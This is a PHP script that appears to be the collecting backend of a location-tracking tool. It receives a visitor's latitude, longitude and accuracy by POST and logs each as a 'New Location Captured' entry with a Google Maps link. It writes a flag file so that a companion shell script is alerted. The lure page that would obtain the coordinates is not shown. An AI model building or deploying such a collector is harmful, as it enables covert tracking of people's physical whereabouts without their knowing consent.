<?php
$date      = date('Y-m-d H:i:s');
$date_file = date('dMYHis');
$latitude  = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
$longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
$accuracy  = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';
/* ── Central data directory ── */
$data_dir = __DIR__ . '/data';
if (!is_dir($data_dir)) {
    mkdir($data_dir, 0750, true);
}
if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
    $data = "=== New Location Captured ===\n" .
            "Latitude:  " . $latitude . "\n" .
            "Longitude: " . $longitude . "\n" .
            "Accuracy:  " . $accuracy . " meters\n" .
            "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\n" .
            "Date:      " . $date . "\n" .
            "\n";
    /* ── Append to master location log with file locking ── */
    $master_log = $data_dir . '/location_logs.txt';
    $fp = fopen($master_log, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $data);
        flock($fp, LOCK_UN);
        fclose($fp);
    }
    /* ── Save individual timestamped file inside /data/ ── */
    $individual_file = $data_dir . '/location_' . $date_file . '.txt';
    $fp2 = fopen($individual_file, 'w');
    if ($fp2) {
        flock($fp2, LOCK_EX);
        fwrite($fp2, $data);
        flock($fp2, LOCK_UN);
        fclose($fp2);
    }
    /* ── Signal shell script that new location arrived ── */
    file_put_contents($data_dir . '/.flag_location', $individual_file);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Location data received']);
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
}
exit();
?>
